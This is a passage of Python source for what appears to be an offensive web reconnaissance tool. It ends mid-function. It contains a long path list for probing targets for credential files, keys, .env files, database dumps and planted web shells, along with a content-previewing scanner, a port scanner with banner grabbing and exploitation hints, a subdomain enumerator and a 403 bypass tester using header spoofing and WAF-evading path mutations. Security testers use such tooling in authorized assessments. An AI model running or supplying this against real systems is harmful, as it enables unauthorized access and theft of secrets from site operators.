    "/wp-content/themes/twentynineteen/",
    "/wp-content/themes/twentyseventeen/",
    "/wp-content/themes/twentysixteen/",
    "/wp-content/themes/twentyfifteen/",
    "/wp-content/themes/twentyfourteen/",
    "/wp-content/themes/twentythirteen/",
    "/wp-content/themes/twentytwelve/",
    "/wp-content/themes/twentyeleven/",
    "/wp-content/themes/twentyten/",
    # ── Joomla Specific ──────────────────────────
    "/administrator/manifests/files/joomla.xml",
    "/administrator/components/com_admin/sql/",
    "/administrator/components/com_admin/",
    "/administrator/components/com_config/",
    "/administrator/components/com_content/",
    "/administrator/components/com_menus/",
    "/administrator/components/com_modules/",
    "/administrator/components/com_plugins/",
    "/administrator/components/com_templates/",
    "/administrator/components/com_users/",
    "/administrator/components/com_media/",
    "/administrator/components/com_installer/",
    "/administrator/components/com_languages/",
    "/administrator/components/com_cache/",
    "/administrator/components/com_checkin/",
    "/administrator/components/com_cpanel/",
    "/administrator/components/com_finder/",
    "/administrator/components/com_messages/",
    "/administrator/components/com_newsfeeds/",
    "/administrator/components/com_postinstall/",
    "/administrator/components/com_redirect/",
    "/administrator/components/com_search/",
    "/administrator/components/com_tags/",
    "/administrator/components/com_weblinks/",
    "/components/com_users/","/components/com_admin/",
    "/components/com_config/","/components/com_contact/",
    "/components/com_content/","/components/com_menus/",
    "/components/com_modules/","/components/com_plugins/",
    "/components/com_templates/","/components/com_media/",
    "/modules/mod_login/","/modules/mod_menu/",
    "/modules/mod_users_latest/","/modules/mod_stats/",
    "/modules/mod_breadcrumbs/","/modules/mod_search/",
    "/plugins/system/","/plugins/user/","/plugins/authentication/",
    "/plugins/editors/","/plugins/editors-xtd/","/plugins/search/",
    "/plugins/content/","/plugins/quickicon/",
    "/templates/system/","/templates/protostar/",
    "/templates/beez3/","/templates/beez5/",
    "/language/en-GB/","/language/en-US/",
    "/libraries/joomla/","/libraries/cms/","/libraries/vendor/",
    "/libraries/legacy/","/libraries/import.php",
    "/configuration.php","/configuration.php-dist",
    "/htaccess.txt","/web.config.txt","/robots.txt",
    # ── Drupal Specific ──────────────────────────
    "/sites/default/settings.php","/sites/default/default.settings.php",
    "/sites/default/files/","/sites/default/files/private/",
    "/sites/default/files/config_","/sites/all/",
    "/sites/all/modules/","/sites/all/themes/",
    "/sites/all/libraries/","/sites/all/translations/",
    "/core/","/core/CHANGELOG.txt","/core/INSTALL.txt",
    "/core/README.txt","/core/MAINTAINERS.txt",
    "/core/COPYRIGHT.txt","/core/LICENSE.txt",
    "/modules/","/themes/","/profiles/",
    "/profiles/minimal/","/profiles/standard/",
    "/profiles/testing/","/profiles/demo_umami/",
    "/CHANGELOG.txt","/README.txt","/INSTALL.txt",
    "/MAINTAINERS.txt","/COPYRIGHT.txt","/LICENSE.txt",
    "/install.php","/update.php","/xmlrpc.php",
    "/user/login","/user/password","/user/register",
    "/admin/config","/admin/content","/admin/people",
    "/admin/reports","/admin/structure","/admin/modules",
    "/admin/themes","/admin/appearance",
    # ── Laravel Specific ─────────────────────────
    "/telescope","/telescope/","/telescope/requests",
    "/telescope/exceptions","/telescope/logs",
    "/telescope/queries","/telescope/mail",
    "/telescope/redis","/telescope/gates",
    "/telescope/schedule","/telescope/commands",
    "/horizon","/horizon/","/horizon/dashboard",
    "/horizon/jobs","/horizon/metrics",
    "/_ignition/health-check","/_ignition/execute-solution",
    "/_ignition/scripts","/_ignition/styles",
    "/_ignition/share-report","/_ignition/update-config",
    "/storage/logs/laravel.log","/storage/framework/",
    "/bootstrap/cache/","/vendor/autoload.php",
    "/artisan","/composer.json","/composer.lock",
    "/.env","/.env.example","/.env.local",
    "/config/app.php","/config/database.php",
    "/config/mail.php","/config/services.php",
    "/config/session.php","/config/cache.php",
    "/config/filesystems.php","/config/logging.php",
    "/config/auth.php","/config/broadcasting.php",
    "/config/queue.php","/config/hashing.php",
    "/config/view.php","/config/broadcasting.php",
    # ── Django Specific ──────────────────────────
    "/admin/","/admin/login/","/admin/logout/",
    "/admin/password_change/","/accounts/login/",
    "/accounts/logout/","/accounts/password_reset/",
    "/accounts/password_change/","/accounts/register/",
    "/static/admin/","/static/admin/css/","/static/admin/js/",
    "/media/","/media/uploads/","/media/files/",
    "/settings.py","/local_settings.py","/requirements.txt",
    "/manage.py","/wsgi.py","/asgi.py","/urls.py",
    "/views.py","/models.py","/forms.py",
    "/__debug__/","/__debug__/sql/","/__debug__/settings/",
    "/silk/","/silk/requests/","/silk/sql/",
    "/django-admin/","/django-admin/",
    # ── Ruby on Rails Specific ───────────────────
    "/rails/info","/rails/info/properties","/rails/info/routes",
    "/rails/mailers","/rails/conductor",
    "/sidekiq","/sidekiq/","/delayed_job",
    "/resque","/resque/overview","/resque/working",
    "/config/database.yml","/config/secrets.yml",
    "/config/credentials.yml.enc","/config/master.key",
    "/db/schema.rb","/db/seeds.rb","/db/migrate/",
    "/Gemfile","/Gemfile.lock","/Rakefile",
    "/.env","/.env.production","/.env.development",
    "/log/development.log","/log/production.log",
    "/log/test.log","/tmp/","/tmp/cache/",
    # ── Spring Boot Specific ─────────────────────
    "/actuator","/actuator/","/actuator/health",
    "/actuator/info","/actuator/metrics","/actuator/env",
    "/actuator/beans","/actuator/configprops",
    "/actuator/mappings","/actuator/loggers",
    "/actuator/threaddump","/actuator/heapdump",
    "/actuator/shutdown","/actuator/auditevents",
    "/actuator/httptrace","/actuator/scheduledtasks",
    "/actuator/caches","/actuator/conditions",
    "/actuator/flyway","/actuator/liquibase",
    "/actuator/sessions","/actuator/quartz",
    "/actuator/startup","/actuator/prometheus",
    "/env","/health","/info","/metrics",
    "/beans","/configprops","/mappings",
    "/loggers","/threaddump","/heapdump",
    "/shutdown","/swagger-ui.html","/swagger-ui/",
    "/swagger-resources/","/v2/api-docs","/v3/api-docs",
    "/webjars/springfox-swagger-ui/",
    "/h2-console","/h2-console/","/jolokia",
    "/jolokia/","/jolokia/read/",
    # ── Cloud Provider Metadata / Credentials ────
    "/.aws/credentials","/.aws/config","/.aws/cli/",
    "/.azure/credentials","/.azure/config","/.azure/",
    "/.config/gcloud/credentials.db","/.config/gcloud/access_tokens.db",
    "/.config/gcloud/","/.boto","/.s3cfg",
    "/aws.json","/aws.yaml","/aws.yml","/aws.env",
    "/gcloud.json","/gcloud.yaml","/azure.json",
    "/credentials.json","/credentials.yaml","/credentials.yml",
    "/service-account.json","/service_account.json",
    "/cloud-credentials.json","/cloud_credentials.json",
    # ── Kubernetes / Container ───────────────────
    "/.kube/config","/.kube/","/kubeconfig",
    "/kubeconfig.yaml","/kubeconfig.yml",
    "/.docker/config.json","/.docker/",
    "/docker-compose.yml","/docker-compose.yaml",
    "/docker-compose.override.yml","/docker-compose.prod.yml",
    "/docker-compose.production.yml","/docker-compose.dev.yml",
    "/Dockerfile","/Dockerfile.prod","/Dockerfile.dev",
    "/Dockerfile.production","/Dockerfile.staging",
    "/.dockerenv",
    "/kubernetes/","/k8s/","/helm/","/helm/values.yaml",
    "/helm/values.prod.yaml","/k8s/deployment.yaml",
    "/k8s/secret.yaml","/k8s/configmap.yaml",
    # ── Terraform / IaC ──────────────────────────
    "/terraform.tfstate","/terraform.tfstate.backup",
    "/.terraform/","/.terraform.lock.hcl",
    "/terraform.tfvars","/terraform.tfvars.json",
    "/variables.tf","/outputs.tf","/main.tf",
    "/backend.tf","/providers.tf",
    "/cloudformation.yaml","/cloudformation.json",
    "/template.yaml","/template.yml","/sam.yaml",
    "/serverless.yml","/serverless.yaml","/serverless.json",
    "/pulumi.yaml","/Pulumi.yaml","/cdk.json",
    "/ansible.cfg","/playbook.yml","/playbook.yaml",
    "/inventory.ini","/hosts.ini",
    # ── CI/CD Config files ───────────────────────
    "/.github/workflows/",
    "/.github/workflows/deploy.yml",
    "/.github/workflows/ci.yml",
    "/.github/workflows/release.yml",
    "/.github/workflows/build.yml",
    "/.github/workflows/main.yml",
    "/.github/workflows/production.yml",
    "/.gitlab-ci.yml","/.gitlab-ci.yaml",
    "/Jenkinsfile","/Jenkinsfile.prod",
    "/.circleci/config.yml","/.circleci/",
    "/.travis.yml","/.travis.yaml",
    "/bitbucket-pipelines.yml",
    "/.drone.yml","/.drone.yaml",
    "/azure-pipelines.yml","/azure-pipelines.yaml",
    "/buildspec.yml","/buildspec.json",
    "/.buildkite/pipeline.yml",
    "/cloudbuild.yaml","/cloudbuild.yml",
    # ── Private Keys / Certificates ──────────────
    "/id_rsa","/id_dsa","/id_ecdsa","/id_ed25519",
    "/private.key","/private.pem","/server.key","/server.pem",
    "/cert.pem","/cert.key","/ssl.key","/ssl.pem",
    "/keystore.jks","/truststore.jks",
    "/.ssh/id_rsa","/.ssh/id_dsa","/.ssh/id_ecdsa",
    "/.ssh/id_ed25519","/.ssh/known_hosts",
    "/.ssh/authorized_keys","/.ssh/config",
    "/server.crt","/server.cer","/ca.pem","/ca.crt",
    "/root.pem","/bundle.pem","/chain.pem",
    "/.pem","/.key","/.pfx","/.p12","/.pkcs12","/.jks",
    # ── Database Dumps / Backups ─────────────────
    "/backup.sql","/backup.sql.gz","/backup.tar.gz",
    "/backup.zip","/dump.sql","/dump.sql.gz",
    "/database.sql","/db.sql","/db.sql.gz",
    "/dbdump.sql","/mysqldump.sql",
    "/site.sql","/wordpress.sql","/wp.sql",
    "/data.sql","/data.json","/data.xml",
    "/export.sql","/export.csv","/export.json",
    "/users.sql","/accounts.sql","/emails.sql",
    "/passwords.sql","/credentials.sql",
    "/backup/","/backups/","/backup-db/",
    "/sql/","/dumps/","/db-backup/",
    # ── Log Files ────────────────────────────────
    "/error_log","/error.log","/debug.log","/access.log",
    "/app.log","/application.log","/server.log",
    "/system.log","/laravel.log","/prod.log",
    "/production.log","/development.log",
    "/logs/error.log","/logs/access.log",
    "/logs/app.log","/logs/debug.log",
    "/logs/laravel.log","/logs/production.log",
    "/log/error.log","/log/access.log",
    "/log/app.log","/log/debug.log",
    "/storage/logs/laravel.log",
    "/storage/logs/error.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/error.log",
    # ── Backup file variants ──────────────────────
    "/config.php.bak","/config.php.old","/config.php~",
    "/config.php.save","/config.php.swp","/config.php.orig",
    "/index.php.bak","/index.php.old","/index.php~",
    "/index.html.bak","/index.html.old","/index.html~",
    "/login.php.bak","/login.php.old","/login.php~",
    "/admin.php.bak","/admin.php.old","/admin.php~",
    "/.htaccess.bak","/.htaccess.old","/.htaccess~",
    "/web.config.bak","/web.config.old","/web.config~",
    "/settings.php.bak","/settings.php.old",
    "/database.php.bak","/database.php.old",
    "/app.py.bak","/app.py.old","/app.py~",
    "/application.py.bak","/main.py.bak",
    "/manage.py.bak","/views.py.bak",
    # ── API Spec / Documentation ──────────────────
    "/api-docs","/api-docs.json","/api-docs.yaml",
    "/api.json","/api.yaml","/api.yml",
    "/openapi.json","/openapi.yaml","/openapi.yml",
    "/swagger.json","/swagger.yaml","/swagger.yml",
    "/postman_collection.json","/insomnia.json",
    "/api/swagger","/api/swagger.json","/api/openapi",
    "/api/docs","/api-spec.json",
    # ── Secret / Token / Key files ────────────────
    "/secrets.json","/secrets.yaml","/secrets.yml",
    "/secret.json","/secret.yaml","/secret.yml",
    "/tokens.json","/tokens.yaml",
    "/api_keys.json","/api_keys.txt",
    "/oauth.json","/oauth2.json",
    "/.vault-token","/.netrc","/.npmrc",
    "/.pypirc","/.gem/credentials",
    "/.yarnrc","/.yarnrc.yml",
    "/.git-credentials","/.gitconfig",
    # ── CMS Themes / Plugins (Info Disclosure) ───
    "/wp-content/plugins/","/wp-content/themes/",
    "/wp-content/uploads/","/wp-includes/",
    "/wp-content/debug.log",
    "/wp-content/mu-plugins/",
    "/wp-json/","/wp-json/wp/v2/users",
    "/wp-json/wp/v2/posts","/wp-json/wp/v2/pages",
    "/xmlrpc.php","/wp-cron.php","/wp-signup.php",
    "/wp-activate.php","/readme.html","/license.txt",
    "/wp-config.php.txt","/wp-config.php.html",
    # ── Development/Debug Files ───────────────────
    "/phpinfo.php","/phpinfo","/info.php",
    "/test.php","/debug.php","/status.php",
    "/health.php","/ping.php","/check.php",
    "/test.html","/dev.html","/debug.html",
    "/temp.php","/tmp.php","/old.php",
    "/upload.php","/shell.php","/cmd.php",
    "/eval.php","/backdoor.php",
    # ── Exposed Source/Config Files ──────────────
    "/package.json","/package-lock.json",
    "/yarn.lock","/bun.lockb",
    "/composer.json","/composer.lock",
    "/requirements.txt","/Pipfile","/Pipfile.lock",
    "/Gemfile","/Gemfile.lock",
    "/go.mod","/go.sum",
    "/pom.xml","/build.gradle","/build.gradle.kts",
    "/settings.gradle","/gradle.properties",
    "/build.xml","/ivy.xml","/pom.xml",
    "/Cargo.toml","/Cargo.lock",
    "/mix.exs","/mix.lock",
    "/pubspec.yaml","/pubspec.lock",
    "/pyproject.toml","/setup.py","/setup.cfg",
    "/Makefile","/makefile","/GNUmakefile",
    "/Rakefile","/Gruntfile.js","/Gulpfile.js",
    "/webpack.config.js","/webpack.config.ts",
    "/vite.config.js","/vite.config.ts",
    "/next.config.js","/nuxt.config.js",
    "/rollup.config.js","/babel.config.js",
    "/.babelrc","/.eslintrc",".eslintrc.json",
    "/.prettierrc","/tsconfig.json","/jsconfig.json",
    # ── Security.txt / Well-known ─────────────────
    "/.well-known/security.txt",
    "/.well-known/acme-challenge/",
    "/.well-known/pki-validation/",
    "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    "/.well-known/change-password",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/.well-known/jwks.json",
    "/robots.txt","/sitemap.xml","/sitemap_index.xml",
    "/crossdomain.xml","/clientaccesspolicy.xml",
    # ── Monitoring / Metrics (exposed) ───────────
    "/metrics","/metrics/","/prometheus",
    "/prometheus/metrics","/grafana","/grafana/",
    "/kibana","/kibana/","/elastic",
    "/elasticsearch","/elasticsearch/_cat/indices",
    "/elasticsearch/_cat/nodes","/elasticsearch/_nodes",
    "/_cat/indices","/_cat/nodes","/_nodes",
    "/_cluster/health","/_cluster/state",
    "/_all/_settings","/_mapping",
    # ── Cloud Storage / CDN ───────────────────────
    "/.s3","/s3-credentials.json",
    "/cdn-cgi/trace","/cdn-cgi/",
    # ── GraphQL introspection ─────────────────────
    "/graphql","/graphiql","/gql",
    "/graphql/console","/graphql/playground",
    "/api/graphql","/api/graphiql",
    # ── Misc sensitive paths ──────────────────────
    "/crossdomain.xml","/humans.txt",
    "/CHANGELOG","/CHANGELOG.md","/CHANGELOG.txt",
    "/README.md","/README.txt","/README",
    "/INSTALL","/INSTALL.md","/INSTALL.txt",
    "/TODO","/TODO.md","/NOTES",
    "/SECURITY.md","/SECURITY",
    "/VERSION","/version.txt","/version.json",
    "/build.txt","/build.json","/revision.txt",
    "/commit.txt","/sha.txt","/git-hash.txt",
    "/.DS_Store","/Thumbs.db","/.editorconfig",
    "/desktop.ini",
]

class SensitiveScanner:
    def __init__(self, url, engine: Engine, logger: Logger, threads=None,
                 tech_cats: Optional[List[str]] = None):
        self.url     = url.rstrip('/')
        self.engine  = engine
        self.logger  = logger
        self.threads = threads or engine.threads
        self.tech_cats = tech_cats or []
        self.found   : List[dict] = []
        self._lk     = threading.Lock()
        self._done   = 0

    def _dynamic_paths(self) -> List[str]:
        """
        Build a dynamic path list based on detected tech.
        Always include generic + core categories; if WordPress is detected,
        add WordPress-specific paths.
        """
        paths = list(SENSITIVE_PATHS)
        # Extra WP paths if WP detected
        if any("WordPress" in c for c in self.tech_cats):
            paths += [
                "/wp-content/uploads/2025/","/wp-content/uploads/2026/",
                "/wp-content/plugins/woocommerce/","/wp-content/plugins/elementor/",
                "/wp-content/plugins/wordfence/","/wp-content/plugins/akismet/",
                "/wp-content/plugins/jetpack/","/wp-content/plugins/yoast/",
                "/wp-content/plugins/all-in-one-seo-pack/",
                "/wp-content/plugins/google-analytics-for-wordpress/",
                "/wp-content/plugins/advanced-custom-fields/",
                "/wp-content/plugins/wpforms-lite/",
                "/wp-content/plugins/updraftplus/",
                "/wp-content/plugins/duplicator/",
                "/wp-content/plugins/all-in-one-wp-migration/",
                "/wp-content/plugins/wp-file-manager/",
                "/wp-content/plugins/revslider/",
                "/wp-content/themes/astra/","/wp-content/themes/oceanwp/",
                "/wp-content/themes/generatepress/","/wp-content/themes/kadence/",
                "/wp-content/themes/storefront/",
                "/wp-content/debug.log","/wp-config.php",
                "/wp-config.php.bak","/wp-config.php.old","/wp-config.php~",
                "/wp-config.php.save","/wp-config.php.swp",
                "/wp-config.php.orig","/wp-config.php.copy","/wp-config.php.tmp",
                "/wp-config.php.txt","/wp-config.php.example",
                "/xmlrpc.php","/wp-json/wp/v2/users",
                "/?author=1","/?author=2","/?author=3",
            ]
        return list(dict.fromkeys(paths))

    def _check(self, path: str):
        # ── Validate path before probing ─────────────────────────────
        if not path.startswith('/'):
            return
        # Block /?filename.ext (no = sign — file-as-query, not a valid probe)
        if path.startswith('/?') and '=' not in path:
            import re
            if re.search(r'\.[a-zA-Z0-9]{2,5}($|&)', path[2:] + '$'):
                return
        full = f"{self.url}{path}"
        resp = self.engine.get(full)
        with self._lk: self._done += 1
        if not resp: return
        sc   = resp.status_code
        size = len(resp.content)
        if sc in (200, 403):
            col = C.G if sc==200 else C.M
            msg = f"  {col}[{sc}]{C.E} {full} {C.DIM}({size}b){C.E}"
            print(f"\r{' '*90}\r{msg}")
            self.logger.log(f"[SENSITIVE][{sc}] {full} ({size}b)")
            preview = ""
            if sc==200 and size < 50000:
                preview = resp.text[:200].replace('\n',' ')
            with self._lk:
                self.found.append({"url":full,"status":sc,"size":size,"preview":preview})

    def run(self) -> list:
        sep("SENSITIVE FILE SCANNER")
        self.logger.section("SENSITIVE FILES")
        paths = self._dynamic_paths()
        print(f"  Target : {C.CY}{self.url}{C.E}")
        print(f"  Paths  : {C.CY}{len(paths)}{C.E}  Threads: {C.CY}{self.threads}{C.E}\n")

        # ── Baseline fingerprint ──────────────────────────────────────
        print(f"  {C.DIM}[*] Fingerprinting site behavior ...{C.E}", end="", flush=True)
        self._baseline   = BaselineChecker(self.url, self.engine)
        self._filter_mode= "filter"
        self._fp_count   = 0
        is_normal = self._baseline.fingerprint()
        print(f"\r  {C.DIM}[*] Site mode: {self._baseline.mode}{C.E}              ")

        if not is_normal:
            choice = self._baseline.warn_and_ask("Sensitive File Scanner")
            if choice == 'abort':
                cprint(C.Y, "  [!] Sensitive File Scanner aborted by user.")
                return []
            self._filter_mode = choice

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(self._check,p) for p in paths]
            for _ in concurrent.futures.as_completed(futs):
                bar(self._done, len(paths), len(self.found))
        print()
        if self._fp_count:
            cprint(C.DIM, f"  [baseline] {self._fp_count} false-positive responses filtered.")

        cprint(C.G, f"\n[✔] Sensitive Scanner: {len(self.found)} exposed")
        self.logger.save("sensitive_files", self.found)
        return self.found


# ═════════════
#  MODULE 5 – PORT SCANNER
# ═════════════
class PortScanner:
    COMMON_PORTS = {
        21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
        80:"HTTP", 110:"POP3", 111:"RPC", 135:"MSRPC", 139:"NetBIOS",
        143:"IMAP", 161:"SNMP", 179:"BGP", 194:"IRC", 389:"LDAP",
        443:"HTTPS", 445:"SMB", 512:"rexec", 513:"rlogin", 514:"syslog",
        587:"SMTP/S", 636:"LDAPS", 873:"rsync", 902:"VMware",
        993:"IMAPS", 995:"POP3S", 1080:"SOCKS", 1194:"OpenVPN",
        1433:"MSSQL", 1521:"Oracle", 2049:"NFS", 2181:"Zookeeper",
        2375:"Docker", 2376:"Docker TLS", 3000:"Dev/Node", 3306:"MySQL",
        3389:"RDP", 4444:"Metasploit", 4848:"GlassFish", 5000:"Flask/REST",
        5432:"PostgreSQL", 5672:"RabbitMQ", 5900:"VNC", 5984:"CouchDB",
        6379:"Redis", 6667:"IRC", 7001:"WebLogic", 7077:"Spark",
        8000:"HTTP-Alt", 8080:"HTTP-Proxy", 8081:"HTTP-Alt2",
        8082:"HTTP-Alt3", 8083:"HTTP-Alt4", 8085:"HTTP-Alt5",
        8086:"InfluxDB", 8087:"Riak", 8088:"HTTP-Alt6",
        8161:"ActiveMQ", 8443:"HTTPS-Alt", 8888:"Jupyter",
        9000:"SonarQube/PHP-FPM", 9001:"Tor/Supervisor",
        9042:"Cassandra", 9200:"Elasticsearch", 9300:"Elasticsearch",
        10000:"Webmin", 11211:"Memcached", 15672:"RabbitMQ-Mgmt",
        27017:"MongoDB", 28017:"MongoDB-Web", 50000:"SAP",
        50070:"Hadoop", 61616:"ActiveMQ", 2082:"cPanel",
        2083:"cPanel SSL", 2086:"WHM", 2087:"WHM SSL",
        2095:"Webmail", 2096:"Webmail SSL",
    }

    def __init__(self, host: str, logger: Logger, threads=100):
        self.host    = urlparse(host).hostname or host
        self.logger  = logger
        self.threads = threads
        self.open_ports: List[dict] = []
        self._lk     = threading.Lock()
        self._done   = 0

    def _scan_port(self, port: int, timeout=1.5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((self.host, port))
            s.close()
            with self._lk: self._done += 1
            if r == 0:
                svc = self.COMMON_PORTS.get(port, "Unknown")
                banner_txt = self._grab_banner(port)
                msg = f"  {C.G}[OPEN]{C.E} {port:5d}/tcp  {C.Y}{svc:<20}{C.E} {C.DIM}{banner_txt}{C.E}"
                print(f"\r{' '*90}\r{msg}")
                self.logger.log(f"[PORT][OPEN] {port}/tcp {svc} {banner_txt}")
                with self._lk:
                    self.open_ports.append({"port":port,"service":svc,"banner":banner_txt})
        except Exception:
            with self._lk: self._done += 1

    def _grab_banner(self, port: int) -> str:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((self.host, port))
            if port in (80,8080,8000,8081,8082,8083,8088,8443,443,3000,5000,9000):
                s.send(b"HEAD / HTTP/1.0\r\nHost: "+self.host.encode()+b"\r\n\r\n")
            else:
                s.send(b"\r\n")
            data = s.recv(256).decode('utf-8','ignore').strip()
            s.close()
            return data[:80].replace('\n',' ')
        except:
            return ""

    def run(self, port_range=None, custom_ports=None) -> list:
        sep("PORT SCANNER")
        self.logger.section("PORT SCANNER")
        print(f"  Host: {C.CY}{self.host}{C.E}")

        if custom_ports:
            ports = custom_ports
        elif port_range:
            ports = list(range(port_range[0], port_range[1]+1))
        else:
            ports = list(self.COMMON_PORTS.keys())

        print(f"  Scanning {C.CY}{len(ports)}{C.E} ports  Threads: {C.CY}{self.threads}{C.E}\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(self._scan_port, p) for p in ports]
            for _ in concurrent.futures.as_completed(futs):
                bar(self._done, len(ports), len(self.open_ports))
        print()

        cprint(C.G, f"\n[✔] Port Scan: {len(self.open_ports)} open ports")

        if self.open_ports:
            interesting = [p for p in self.open_ports
                          if p['port'] in (21,22,23,3306,5432,6379,27017,2375,9200,11211)]
            if interesting:
                print(f"\n  {C.Y}[!] Interesting / Dangerous open ports:{C.E}")
                for p in interesting:
                    risk = self._risk(p['port'])
                    print(f"    {C.R}⚠ {p['port']}/{p['service']}{C.E}  {risk}")

        self.logger.save("port_scanner", self.open_ports)
        return self.open_ports

    def _risk(self, port) -> str:
        risks = {
            21:"FTP - often anonymous login possible",
            22:"SSH - brute-force possible",
            23:"Telnet - plaintext credentials",
            2375:"Docker API - unauthenticated RCE possible",
            6379:"Redis - often unauthenticated",
            27017:"MongoDB - often unauthenticated",
            9200:"Elasticsearch - data exposure",
            11211:"Memcached - amplification DDoS / data leak",
            5432:"PostgreSQL - check for weak creds",
            3306:"MySQL - check for weak creds",
        }
        return risks.get(port, "")


# ═════════════
#  MODULE 6 – SUBDOMAIN ENUMERATOR
# ══════════════
class SubdomainEnum:
    WORDLIST = [
        "www","mail","ftp","admin","api","dev","staging","test","beta","app",
        "secure","portal","vpn","remote","smtp","pop","imap","webmail",
        "ns1","ns2","ns3","dns","cdn","static","assets","img","images",
        "media","shop","store","blog","forum","support","help","docs",
        "wiki","git","gitlab","jenkins","ci","grafana","kibana","elastic",
        "db","database","mysql","mongo","redis","postgres","backup",
        "archive","old","new","mx","mail2","intranet","internal","corp",
        "crm","erp","hr","finance","dev2","staging2","uat","qa","sandbox",
        "api2","v1","v2","s3","cloud","status","monitor","mobile","m",
        "auth","login","sso","oauth","id","identity","accounts",
        "dashboard","panel","control","manage","cpanel","whm",
        "www2","ftp2","smtp2","mail3","exchange","owa","autodiscover",
        "sharepoint","teams","zoom","meet","conference","video",
        "downloads","upload","files","data","repo","svn","hg",
        "nagios","zabbix","splunk","elk","logstash","influx",
        "analytics","tracking","pixel","ad","ads","promo",
        "preprod","pre-prod","prod","production","live","demo",
        # Extended
        "admin2","admin3","admin4","admin5","root","superadmin",
        "webadmin","webmaster","sysadmin","operator","moderator",
        "apollo","atlas","borealis","brand","business","careers",
        "chat","cloud","community","connect","crm","data","db",
        "desktop","developer","developers","digital","direct",
        "education","email","employee","employees","eng","engineering",
        "events","external","extranet","feedback","finance","forum",
        "gallery","games","gateway","gift","go","government","groups",
        "helpdesk","home","host","hosting","idp","images","info",
        "innovation","insights","internal","investor","investors",
        "ios","ip","jobs","kb","knowledgebase","lab","labs","learn",
        "learning","legal","link","links","list","live","local",
        "location","log","login","m","mail","marketing","media",
        "meet","member","members","meeting","metrics","misc",
        "mobile","mssql","mysql","news","newsletter","newsroom",
        "old","ops","partner","partners","payment","payments",
        "people","personal","photos","play","podcast","portal",
        "press","product","products","projects","promo","proof",
        "proxy","public","purchase","quotes","reports","resources",
        "sales","sandbox","search","secure","security","services",
        "shop","sitemap","social","staging","start","static",
        "stats","status","storage","store","stream","streaming",
        "student","students","support","survey","talent","talk",
        "team","teams","tech","testing","tools","training",
        "travel","tv","twitter","upload","uploads","us","user",
        "users","vdi","video","videos","vpn","web","webinar",
        "whm","wiki","work","workplace","workspace","www","www1",
        "www2","www3","www4","www5","www6","www7","www8","www9",
        "www10","xml","xmail","xmpp","zabbix","zoho","zoom",
        # Cloud
        "s3","ec2","eks","ecs","rds","lambda","cloudfront",
        "azure","aws","gcp","gce","gke","aks","blob","cdn",
        "static","assets","media","images","video","download",
        # Management
        "panel","cpanel","whm","webmin","plesk","directadmin",
        "ispconfig","vesta","sentora","zpanel","kloxo",
        # CI/CD
        "jenkins","ci","cd","build","deploy","release","staging",
        "production","prod","uat","qa","test","sandbox","dev",
        # Monitoring
        "monitor","monitoring","status","health","grafana",
        "kibana","prometheus","alertmanager","nagios","zabbix",
        "splunk","datadog","newrelic","sentry","rollbar",
        # Databases
        "mysql","mariadb","postgres","postgresql","mongo",
        "mongodb","redis","memcached","elastic","elasticsearch",
        "cassandra","neo4j","influx","influxdb","clickhouse",
        # Other
        "api-gateway","api-gw","gateway","proxy","edge",
        "ws","websocket","socket","mqtt","amqp","rabbitmq",
        "kafka","zookeeper","hadoop","spark","hive","presto",
    ]

    def __init__(self, url, logger: Logger, threads=50):
        self.domain  = urlparse(url).netloc.split(':')[0]
        self.base    = '.'.join(self.domain.split('.')[-2:])
        self.logger  = logger
        self.threads = threads
        self.found   : List[dict] = []
        self._lk     = threading.Lock()
        self._done   = 0

    def _check(self, sub: str):
        host = f"{sub}.{self.base}"
        try:
            ip = socket.gethostbyname(host)
            msg = f"  {C.G}[FOUND]{C.E} {host:<40} → {C.CY}{ip}{C.E}"
            print(f"\r{' '*90}\r{msg}")
            self.logger.log(f"[SUBDOMAIN] {host} -> {ip}")
            with self._lk:
                self.found.append({"subdomain":host,"ip":ip})
        except socket.gaierror: pass
        with self._lk: self._done += 1

    def run(self) -> list:
        sep("SUBDOMAIN ENUMERATOR")
        self.logger.section("SUBDOMAIN ENUM")
        print(f"  Base: {C.CY}{self.base}{C.E}  Wordlist: {C.CY}{len(self.WORDLIST)}{C.E}\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(self._check,s) for s in self.WORDLIST]
            for _ in concurrent.futures.as_completed(futs):
                bar(self._done, len(self.WORDLIST), len(self.found))
        print()
        cprint(C.G, f"\n[✔] Subdomain Enum: {len(self.found)} found")
        self.logger.save("subdomains", self.found)
        return self.found


# ════════════════════
#  MODULE 7 – 403/401 BYPASS TESTER  (Enhanced)
# ════════════════════
class BypassTester:
    def __init__(self, base_url, path, logger: Logger):
        self.base   = base_url.rstrip('/')
        self.path   = path.strip() if path.strip().startswith('/') else '/'+path.strip()
        self.logger = logger
        self.found  : List[dict] = []
        self._mutator = PathMutator()

    def _try(self, label, method, url, headers=None):
        h = {"User-Agent": random.choice(Config.UA_LIST)}
        if headers: h.update(headers)
        try:
            r = requests.request(method, url, headers=h, timeout=8,
                                 verify=False, allow_redirects=True)
            sc = r.status_code
            col = C.G if sc==200 else (C.Y if sc in (301,302) else C.DIM)
            tag = f"{C.G}✔ BYPASS{C.E}" if sc==200 else f"{sc}"
            print(f"  {col}[{sc}]{C.E} {tag}  {C.DIM}{label[:45]:<45}{C.E}  {C.DIM}{url[:60]}{C.E}")
            self.logger.log(f"[BYPASS][{sc}] {label} {url}")
            if sc == 200:
                self.found.append({"url":url,"method":method,"label":label,"status":sc})
        except: pass

    def run_silent(self, engine: Engine):
        """Runs without printing header – used by AdminFinder."""
        t = f"{self.base}{self.path}"
        # Header bypass
        for h in Config.BYPASS_HEADERS:
            try:
                hdrs = {"User-Agent": random.choice(Config.UA_LIST)}
                hdrs.update(h)
                r = engine.sess.request("GET", t, headers=hdrs, timeout=6,
                                        verify=False, allow_redirects=True)
                if r.status_code == 200:
                    self.found.append({"url":t,"method":"GET","label":str(h),"status":200})
                    return
            except: pass
        # Path variants (WAF-evading mutations)
        for variant, label in self._mutator.variants(self.path):
            try:
